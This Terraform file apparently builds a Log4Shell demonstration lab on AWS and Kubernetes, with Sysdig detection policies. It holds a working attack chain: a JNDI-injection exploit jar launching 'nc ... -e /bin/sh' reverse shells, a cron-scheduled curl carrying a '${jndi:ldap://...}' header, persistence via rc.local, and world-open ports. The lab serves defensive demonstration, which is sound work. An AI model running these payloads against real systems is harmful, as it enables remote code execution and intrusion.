# Implementation example for
# https://docs.google.com/document/d/1sRrJ5VKNRGYk6b8laOwF7FEZ67V2LBXj-asMo27XQEY/edit#

locals {
  app_endpoint = coalesce(
    kubernetes_service.log4j-service.status[0].load_balancer[0].ingress[0].hostname,
    kubernetes_service.log4j-service.status[0].load_balancer[0].ingress[0].ip
  )
}

resource "helm_release" "log4j-app" {
  name             = "log4j-app"
  chart            = "${var.charts_path}/log4j-application"
  namespace        = "java-app"
  timeout          = 600
  create_namespace = true

  values = []

}

data "aws_region" "current" {}

resource "kubernetes_service" "log4j-service" {
  depends_on = [
    helm_release.log4j-app
  ]

  metadata {
    name      = "log4j-service"
    namespace = "java-app"
  }

  spec {
    selector = {
      "app.kubernetes.io/name" = "log4j-application"
    }

    port {
      port        = 8080
      target_port = "http"
    }

    type = "LoadBalancer"

    #IP whitelisting (only the EC2 instance)
    load_balancer_source_ranges = ["${module.ec2_instance.public_ip}/32"]
  }
}

module "vpc" {
  source  = "terraform-aws-modules/vpc/aws"
  version = "~> 3.0"

  #TODO: Try to set an easy to identify prefix name
  #name_prefix = "terraform-demo"
  cidr = "10.0.0.0/24"

  azs            = ["${data.aws_region.current.name}a"]
  public_subnets = ["10.0.0.0/24"]

  enable_dns_hostnames = true

  enable_flow_log                      = false
  create_flow_log_cloudwatch_iam_role  = false
  create_flow_log_cloudwatch_log_group = false

  tags = {
    #TODO: Add a suffix identifier, should be terraform-demoenv-${var.name}
    CreatedBy = "terraform-demoenv"
  }
}

resource "aws_security_group" "ssh_access" {
  vpc_id = module.vpc.vpc_id

  #SSH For EC2 provisioner and troubleshooting
  ingress {
    from_port = 22
    to_port   = 22
    protocol  = "tcp"
    cidr_blocks = [
      "0.0.0.0/0",
    ]
  }

  #LDAP Server
  ingress {
    from_port = 1389
    to_port   = 1389
    protocol  = "tcp"
    cidr_blocks = [
      "0.0.0.0/0",
    ]
  }

  #Download java class
  ingress {
    from_port = 8180
    to_port   = 8180
    protocol  = "tcp"
    cidr_blocks = [
      "0.0.0.0/0",
    ]
  }

  #Ncat listener
  ingress {
    from_port = 4444
    to_port   = 4444
    protocol  = "tcp"
    cidr_blocks = [
      "0.0.0.0/0",
    ]
  }
}

resource "tls_private_key" "this" {
  algorithm = "RSA"
}

module "key_pair" {
  source = "terraform-aws-modules/key-pair/aws"

  key_name_prefix = "terraform-demoenv"
  public_key      = tls_private_key.this.public_key_openssh
}

data "aws_ami" "amazon-linux" {
  most_recent = true
  owners      = ["amazon"]

  filter {
    name   = "architecture"
    values = ["x86_64"]
  }

  filter {
    name   = "root-device-type"
    values = ["ebs"]
  }

  filter {
    name   = "name"
    values = ["amzn2-ami-hvm-*-gp2"]
  }
}

module "ec2_instance" {
  source  = "terraform-aws-modules/ec2-instance/aws"
  version = "~> 3.0"

  #TODO: add an environment suffix name
  name = "log4j-attacker-host"

  ami                         = data.aws_ami.amazon-linux.id
  instance_type               = "t2.micro"
  key_name                    = module.key_pair.key_pair_key_name
  vpc_security_group_ids      = [module.vpc.default_security_group_id, aws_security_group.ssh_access.id]
  subnet_id                   = module.vpc.public_subnets[0]
  associate_public_ip_address = true

  tags = {
    #TODO: Add a suffix identifier, should be terraform-demoenv-${var.name}
    CreatedBy = "terraform-demoenv"
  }
}

resource "null_resource" "provision-scripts" {
  depends_on = [
    null_resource.provision-files
  ]

  triggers = {
    #Install Netcat and Java
    yum_install = "sudo yum -y install nc java-1.8.0-openjdk"
    #Add java app and netcat to rc.local
    rc_local = <<EOT
      sudo bash -c "echo \"java -jar /home/ec2-user/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C 'nc ${module.ec2_instance.public_ip} 4444 -e /bin/sh' -A '${module.ec2_instance.public_ip}' &\" >> /etc/rc.local"
      sudo bash -c "echo \"/home/ec2-user/start-nc.sh &\" >> /etc/rc.local"
      EOT

    #Add the trigger to cronjob
    cronjob = <<EOT
      sudo bash -c "echo \"32 2 * * * root curl -H 'X-Api-Version: \\\$${jndi:ldap://${module.ec2_instance.public_ip}:1389/getjdk7}' http://${local.app_endpoint}:8080/\" >> /etc/crontab"
      EOT

    #Start java and netcat applications with nohup
    #NOTE: nohup needs a sleep before tearing down the connection (https://stackoverflow.com/questions/36207752/how-can-i-start-a-remote-service-using-terraform-provisioning)
    start_apps = <<EOT
      sudo killall -9 start-nc.sh
      sudo killall -9 ncat
      sudo killall -9 java
      chmod +x /home/ec2-user/start-nc.sh
      nohup sudo java -jar /home/ec2-user/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C 'nc ${module.ec2_instance.public_ip} 4444 -e /bin/sh' -A '${module.ec2_instance.public_ip}' > java.out &
      nohup /home/ec2-user/start-nc.sh > ncat.out &
      sleep 2
      EOT
  }

  connection {
    type        = "ssh"
    user        = "ec2-user"
    private_key = tls_private_key.this.private_key_openssh
    host        = module.ec2_instance.public_ip
  }

  provisioner "remote-exec" {
    inline = [
      self.triggers.yum_install,
      self.triggers.rc_local,
      self.triggers.cronjob,
      self.triggers.start_apps,
    ]
  }

}

resource "null_resource" "provision-files" {

  depends_on = [
    module.ec2_instance
  ]

  triggers = {
    version = "v2"
  }

  connection {
    type        = "ssh"
    user        = "ec2-user"
    private_key = tls_private_key.this.private_key_openssh
    host        = module.ec2_instance.public_ip
  }

  #Provision jar file
  provisioner "file" {
    source      = "${path.module}/files/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar"
    destination = "/home/ec2-user/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar"
  }

  #Provision netcat script
  provisioner "file" {
    source      = "${path.module}/files/start-nc.sh"
    destination = "/home/ec2-user/start-nc.sh"
  }

  #Provision commands sent by netcat
  provisioner "file" {
    source      = "${path.module}/files/nc_commands.txt"
    destination = "/home/ec2-user/nc_commands.txt"
  }
}

resource "sysdig_secure_policy" "log4j_incident_response" {
  name        = "Log4j incident - app exploited"
  description = "Detect a Log4j vulnerable application is being exploited"
  severity    = 4
  enabled     = true

  // Scope selection
  #scope = "container.id != \"\"" #TODO: Set scope for log4j-app cluster and namespace

  // Rule selection
  rule_names = [
    "Privileged Shell Spawned Inside Container",
    "Netcat Remote Code Execution in Container",
    "Mount Launched in Privileged Container",
    "Suspicious Cron Modification",
    "Redirect STDOUT/STDIN to Network Connection in Container",
  ]

  actions {
    capture {
      seconds_before_event = 5
      seconds_after_event  = 10
    }
  }

  notification_channels = []

}

resource "sysdig_secure_policy" "host_suspicious_write" {
  name        = "Log4j incident - host suspicious write"
  description = "Detect activity in the host where the log4j container applicaiton is running"
  severity    = 4
  enabled     = true

  // Scope selection
  #scope = "container.id != \"\"" #TODO: Set scope for log4j-app cluster and namespace

  // Rule selection
  rule_names = ["Write below root"]

  actions {
    capture {
      seconds_before_event = 5
      seconds_after_event  = 10
    }
  }

  notification_channels = []

}
